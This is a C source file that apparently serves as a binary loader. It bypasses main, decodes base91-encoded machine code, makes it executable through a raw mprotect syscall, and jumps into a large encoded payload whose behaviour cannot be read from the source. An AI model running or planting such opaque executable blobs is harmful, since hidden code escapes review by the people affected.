#include <unistd.h>
typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long long u64;
#define BASMCALL __attribute__((ms_abi))
void b91tobin(void *dest, char const *src) {
    u8 *p = (u8 *)dest;
    u32 eax = 0x1f;
    while (1) {
        while (*src == '\0') src++;
        u32 x = (u32) *src++;
        if (x < 0x24) return;
        while (*src == '\0') src++;
        u32 y = (u32) *src++;
        eax <<= 13;
        eax += (y - 0x24) * 91 + (x - 0x24);
        do {
            *p++ = (u32) eax;
            eax >>= 8;
        } while (eax & (1 << 12));
    }
}
#pragma pack(push, 1)
typedef struct {
    u64 env_id;
    u64 env_flags;
    u64 win[2];
    void *fn_table[6];
} PLATFORM_DATA;
#pragma pack(pop)
typedef int (BASMCALL *stub_ptr)(void *, void *);
char payload[][4096] = {
"%Q$$,$uy$$r-YNdd%Hag-17=DjRY(n\?thl&eSi~_RvMwXpIf-x@FtZy\\&^$8+=<[)j\\ABz.@+sg-K6<b}O3Ma,dM\?[y5%@A7J4o_NKW8s(r}x%&f=\?a8fV*JV5fzvM3D7,-0RVu=>Qr%JuAQq_<l=X+M'q>gt8)ZXrp4WOOThTqIK-Ksi13Tq0V\\$JMUB^`0hH\?OEif0V$rSAq(xPx_V_mSO@Di3`oH{eWRmps22Be\?YeU=[B=aNX'RiKwd=R_q{vtko'-0WI$Vo^D18B-D&sKQpH|q1=;<Uc-&ac,*dJ{z0Q`4I;oekT$@\\wXQax7Vx4YofAg5fs''%u3,4K^rO},G)P*Ag|(`[\?do+<Mz&{3P4sablJcU,RwKR9i*v'c7q*Irh3iipW'Cu2.jd~;L2eN.P]0ULAg\\wMX]$.BU\?Wpz(t:&-YVJI.uO@QxXH'SKJRUdV\\pjL_GX\\_m]i;dP._tYwI,Gi>08qn_wry^8kIy4kj*m|WtcL/.]tZ6tln5&JZl&EY+E-dWC3n$,wMD=rdvXr'CvnSQZphtR%u'$-^|&s)B\\JwY'c_MC|s}%Mu,pS0]D85<.&.1T.k^XXH1;fpC.md*~27DbX~h2$[X85~&6-frvAg`Wg[r|PX@Sxz>y>Cl,$_Ins@nc`RPtIe<iPP*LZWNP6HwqihNdAS/B)R>U7Q/UfKEYIn\?-BQ<0y24[Skks6mVC+HzRe$`NW3bc^TKe\?F.^(~=Evi6N`&waV]D^=j*[=wGw5[7h[[g~04wt}vV\\SyXuF}d+D<FT(vEf8-aFRI3-UGPmz-R]`zp9AEMmJcH4AFcU2;2wy)k,M3f4weQUaYp03es1}Uub]=2LJh.uJE+IwYig)(jo4,\?~|WV6CoSV\?23/VZbEz=;|`r9Qz*6PMLK89m'6'/ki8T(mEZmwa5I7kyr8AGp\?V,,DEWDSEa};vUY3m(oH3y<^twPN/S%d9G:af$$mYZkho50YP@u91__j[3xW[e,m+3\\lMC+z-Bm{\\Fq8]'+h$XEGLuJg2=koOJ5:ST_y*ge7TBzx7J@14tp-B'u-Njz*xVRV@TJ,8$1BmC0qj10E;W]%q|Nph\\}lZ&dgE2bkl3q)mT4)e.2TyGcb=/)&-0kXC;,<8Vf=KnT,PCT,FE8iTLXH/6jX6TiMoPkVlnB&TL,uKGfGO,-xkUdV-:C'l|F|Y]G,q9&VfD&U1*`}lbTER'1TKD`}gts2lcXo<=R[t%pNf4%EP18%nO8ED[C=h&OzHj\\ms0RmKjFjV.nfrN'$^B%>ApL7kSWI<*NgX2.eZU|3NxO%kvw~6[L}3Hr$hV-$lE/7DV[(5lgE]|S$=(6[/++;$;q]&8_EVK{5o~$cnrPkwK`E@U38C3bh5d>\?y>ho:v00ZYyF:~,\?=%B1=\\JoBF6Ttd|O^DzzsOk9{|P'v--B0uzcB([uw'<vF0BWH7}Jlo]K1~x$]%9]u&Y8_gq_2_6zLt\?Qsh0SVfGYl$(_[zowgNhwz..s6\\Owf&{~Kn%l4NWA4;bE3czjGO-.mssNKB)RYpPgg}D285\\'[)-=S(,Ko65W`r/cv-CncZCUVr*\\A<)>pL<3W;=aH%P/@u2x5c/$aOh;,V*)XEy:]2<^J'`~>QM{2o@e>qMP+&H7>(ZP&{cF$eK6<ICE8/liir0MV8*t$>-gViGiSC@K=r{Xnmc8tS]v:92Ziq8///=6jtZ&qE8{=&TU4tY1msHcZMDr)0LWD&R2[^{{1RtZC$P&f=/sO:oQK%d,GXq>s;OA)Ue.pHdjyD6:G%Mx,a$|ALPWbPKg@X65t1XF%.g;\\yN:'Wc;TcEX4{KAUr)wD\\6rLj4(3(|u2sg<;Ey0N%>i)$;Q8cCg%~b-G2_[W{d]eZq|xd)w'Zk0w_v66S\\B9A=\?W:2RP0cPB}sMcA[I|$[+%<<B[e|CMkVX`$<yQ.Q`4zp[6DN&ql;*Z2h@y3^^DoGUn*4/u8MkmmOu6omm<u',4E[AuOH&na-9J1/`Nwpr_F3}__9lLtftS]>eQ_G}7&TlW)[X(Q2r}K5sh*2b]~M@4+PJqGtp|_U1%KoH|JY~8r^&}%r5]Szt'$E'=FU}ewy&;6e`7,XI_R{CSV,NMNGJ^t^)<}FT=K383R&sA\\jOF{yR)-hJD^szH;|Hn`Z&`DxstY0.dsRviJ{7RRB{=ZfQ{28~j|'8d$eaItaEfZMV+d93Ftq;5Rnhsm/7cDR3xVONlfmA$*^@Q\\;7x.jW5IS[r;T5)'Augjw.vPahw6Q`zTif.Kusj8W>\?jJ=cua\\M`SgIN7R8j)-G9Uj}BtePU=@]$ml7%|:aJJc7Ka]QD2(7<wq[J:W'F)Ic~2Jnw\?T<KQ(^7a*RUqd$q\\dz|;LMVnt}ng8crf/Xeghb2r(PYUv>:zV())uoup7E<_MXURw'%Z&Vnxz|%EP@`:8BK5&cH\?uV\\^<Ndy;w^Ep*:tZ[tpWs'fS8:%o_`+Of4gMlGsmG5Jw[Cm\?&\?>%Pm*M\\@Isont6{z;7AV^Hope{io2IaT=den]uqpaoM$5QboJXD~}45=n>R'K|PgVNox)NJ1VZm{CzXEUhijspFVh$d[CowdKEkl'dXY^mJ6l%gC)dp=x5N`rNo(y5uU_\?Td,|TVKY07J94Dr7IU|Fk^xvmi$J5jv$RC}a\\9|evKj-0tl~iQf0uAn.ns'VIjIO[CBp|po0H*4Nbexd/S-tz^Pnu9,wF3T4U>]6Zi:h`kMUjT$E&:p+cw`X^-VJ:$RFeYOY{>4@J.HYIJY<d*G&x1LX:8uR9)0r${vgyV5w<@P}&Y(;XIDsUbSG2dK)Y}._v8-<}F_k@LC.yEG5oD}fePZCMO/EnXiNwMq+\\b;EpZGi>eq.t|YytZEGjF6Rn*&bmS}L,b3z;8bQH&h^YgL~t-(IA29v9v8z&/]4cIh~Eo..oC$i)INU++''5=5@I{S,i<;Vt.2d-g3\?fm[4z@\\`_>W:]&NGP7%opq;kR'6_/F%s\?=,U'=Pb9Z4i[LFF2iZPY=N$;C=&MA]l^G+W>\?89\?w+Z(~R{wu1\?Li3DC$9,>ura]^6\\Z2*R}\?*e\?9,dMDQx$x2U>i2Br57v)B%OtMqDhBxN60vJbVwlJcnl&(`5EVn9=J$\\xe0*AQPt|-d*=mXD-,uZ4wrq_^{zO>jfq{^rLpcsS[Kg,rjS,%]0bVQ)HZuWt0,r$\?QBM_yMq|.u]d7@6F\?/$s4.3w6|_qj3ErU5Wp\?RsN;,m5pxv(pyA+{MX.<ly9b>+xQ03EVk3sd_/rO\?$01<0X:LDZ'qG{9\\rG0Q/spsk{4]DKHan59soh1dM0t9/=xs,fe|pCO\\cl(JRQ$%lys{'D}hOU+dDkPh1k(jE^d_7/{jEil-rS'))<b`n_TMEq3\\L%W0\\4:hH|Pj,jnp,'0$l^&96clTVT).yz9w.wp\\nS7F)v44\?3n3s,2I.rq(kp`<(k+*(s0llI$lhg9f>-.9({DA{lu/L=BUowCOrW2MHC6;hYqu'3E$R|[-\\~%hUUDoFR>x&yP3t+i4cr-]Mb/^]MpiabCkl}Gk6N9-V9'lbjbay\\=^|;Z6}s7TWA`9)o61^bLDC'e2AGAEkh_h}kb94/is)~@.$vNfO4e[MNRn+h&CH<:{*_XP9~`pzu_3L)p'ob&p3hIafHZOQvCx]cQ&(b,~]cIHWzGMA';m{IbE-]j)p:|1f;Rdbb:x/29j)y2+}f69gShZR+'A\?}q-\\z[Yx^q3otil.i2itTCOh~DO,}Y$TtjS0hIn4ZN=>(z`r*|<2eaw=_J-\\IRZ%OjRL>V5eg'4kT(bHmb*-V_l&K:hwa.1tc+`Ff\?A]FNZ3X}0{pna{;TY$Dhr}MKzhk(>d(x-fl+]nxi$Pttq}$./X9)H`hG&/<02rlGuK/}9pzWlIbP/2I*rG2iEXi7;YAE*E7bl=nR\?L$T1YbJ7)0+'C'tHuLn5%TG{M+GMG={K/cREctGxnP$[qS{~CDa2N>RpKPx`4w$kqWkua=H&wfZ3Olbt_|R*H{b2JrnyC8g|'J2f^o=4}|+*7L3p9Cf-/Cr9M6iMRXh\?gyWT6AEXpiLZ98-%zx/Jejk<%_-z$Yl*uF_k4/P7t9u~JfQce3FNQUvOdO=UNvy31={KwVnk,h4n$8+J",
"L{_xv<dG++:PV%S1fG@5A2NBYuMy9{f\\;v:U%HXoR(gAh|jz4SM9V9_U]:d>:`v9mQR4s(,y{-c5`fL_rwy|yx>>`vd;fz*UfC}+fChG)/\?wf4PRC'sm.Bts-o0<1A4{4ZS2g^bPZ5Z\?:\\sI5u[kw+CD0nkk=ji6D,tiwNT<=IvuFA|mb[}$e&IKerX{H0$%SsLr;tt]OsJ/2{-1S.WL7`We.XGj[0DpqMT+K>sF=dP'm<qFQWkj^a\\~0v05+Sw<(v^Sn]BHP{mo|:cPR@zI}T['%=*_MSIgRIov[\?dXaHoD.EZb]}Sf5-WXJU)>|^<|b'>bSVj*LZ'<o<V>.iTue0$p,1NTwxW;Pn=&(e$E.>p{JOcZ>IGYR6UzyNhh{'KjodH;.0>lqu$QubWoj=p=\?d8a'vz/u4R|3P^CSyl|TUptidVE+Rg.>$zz01B](fQGy5LuX:]1{|kLO/f8RcGG:DW<3JM>A`PiKHku.$:2ms%CA%cX&t3diWZIR&z'[:W\?uzc5y.g8gWL2u-h[w,NeMySCL{I5SeRCu&k}@Ik,W1rvkA_rd'D}e20{N&ciDTl[(4(f4(Dhj34J1aDn-O}d$gyMPZv:4o'@lX+ML:;{hB*|(l7=sp[7GAFxcSd8UHTm\?SEq)QhxNu4pya69\?CHXfV&tL(To(Tv-qiT-+}1]N~Lx4,O'rb.o.;|+86qm7^mXb\?c\\h8N./_U{OabdbdXR-'ZA-JiEU%+8/8B3Uj'-Jpc%PKk=69/NWu$km1uHA1dMP7,O2)GlT2<EXI\?+[cnXige|-=peI3<,[HWVw{&e4vfCLjYA_,\\hC8aZn.3n3yxE(W;tg4oW'sYw<8$%}4JVHELgF>I\\E5UX[M_ankA-Jka6%f8q`\?5cK)0zuME}u\\=WK1_0bWlXg1+D,il_axPyQ<_(:K1{&]\\U^:Zwyh2Uf'ful8hiQ(Ep8ludVQX;4,:_i'-.0G2/E%cD>8LPZ`(4.9nC5%wmsBo9q\?3$7Gww$-qgJXkH*u3EKMv&JK+|GBZcbltaf1>Uf.fqvzoG{O7j7`%!",
};
int main() {}
#ifdef __cplusplus
extern "C"
#endif
int __libc_start_main(
    void *func_ptr,
    int argc,
    char* argv[],
    void (*init_func)(void),
    void (*fini_func)(void),
    void (*rtld_fini_func)(void),
    void *stack_end) {
    PLATFORM_DATA pd;
    pd.env_id = 2;
    pd.env_flags = 1;
    u8 stubbuf[68 + 580];
    b91tobin(stubbuf, "H;|DR:$$$|7x6E69i$6',&%Q$$?@GjeBmVodz$C?$$c7h{.>j<g9%Q$$Q80&F$$$f5U$5L@=aT8S92:|1&.C!");
    b91tobin(stubbuf + 68, "Y*HZDWg'h'+AJed<1m^VaWqpU$_G/>xG6yG6_G/>zGY`0SPY|<)$,$$$*]-Pm|w$^F]T21/>Td)nL;AtUmVHZm<Hd/zNA(^hc7]uha*D'_wbz;@=z;g+&njbF|Y8/<m$])^VV&R$$$l)<1>%fO50]<SEENJBT_o\?GZ$\\i)Y`A)dstl@',Q$$]<\\4L>iQ>%ro:01&F%U&aL9-54%=fQS%cbm&W34,D}2>O^;;Td59xbQmT1b=]<Z4cn`Lw{$Y6i06zNpkG4z[XHU%$%,$0@cned]uvVbj)uTYTV_s($<Ro(g|TsQe6VDWU=&QL&Jgx+vytg3)BdHKRg\\,r[xl+jq&;/A=:KlhLRFj,TE1:{,|$Y_g4QjQl);2fBwq8Y%~G}$Y]Y$[u4RgN|pyEhJ=4S$$%QH..w`db7yB;t,`_ST0Rg&t}\?lsBcEhqE8^n]S}u|X}4&At<&G.,U3}8{n[8@zyIRM<*+c}GDUA2mxbpbIxRg:|+bFdLcvb4/&w]1K-EZ_-=h*:MRp1=$]\\eJ2n0]OI<8[}5VdzBUi>IeuW7|jkbV0yvy\\\?%:T},7CY]+</p.\\7N|U{[zE)$~:/sJMEiTpltC5YG=zQhPoDL%~1U0oli'97RgrTIgFdYx'Vca^dCj\\)69\\swWLm-JOgQe6)3$jtE\\8;Z=%~B}VlCHAHP:%~GIxT.RDkO;:-Jey}[\?DWr'q'_*Ps]*:|1&!");
    size_t base = ((size_t)main) & 0xFFFFFFFFFFFFF000ULL;
    *(u64 *)(stubbuf + 0x08) = (u64) base;
    *(u32 *)(stubbuf + 0x11) = (u32) 4096;
    base = ((size_t)stubbuf) & 0xFFFFFFFFFFFFF000ULL;
    size_t len = (((size_t)stubbuf) + 68 + 580) - base;
    len = ((len + 0xFFF) >> 12) << 12;
    syscall(10, base, len, 0x7);
    pd.fn_table[0] = (void *) (stubbuf + 0x1c);
    b91tobin(payload, (char const *)payload);
    return ((stub_ptr) stubbuf)(&pd, payload);
}
